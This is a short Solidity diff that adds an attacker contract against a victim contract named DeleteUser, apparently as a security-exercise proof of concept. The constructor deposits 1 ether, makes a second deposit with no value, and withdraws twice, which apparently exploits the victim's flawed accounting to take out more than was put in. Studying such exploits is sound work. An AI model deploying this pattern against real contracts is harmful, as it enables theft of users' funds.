@@ -29,3 +29,15 @@ contract DeleteUser {
         msg.sender.call{value: amount}("");
     }
 }
+
+contract DeleteUserAttacker {
+    constructor(address _victim) payable {
+        DeleteUser(_victim).deposit{value: 1 ether}();
+
+        DeleteUser(_victim).deposit();
+
+        DeleteUser(_victim).withdraw(1);
+
+        DeleteUser(_victim).withdraw(1);
+    }
+}
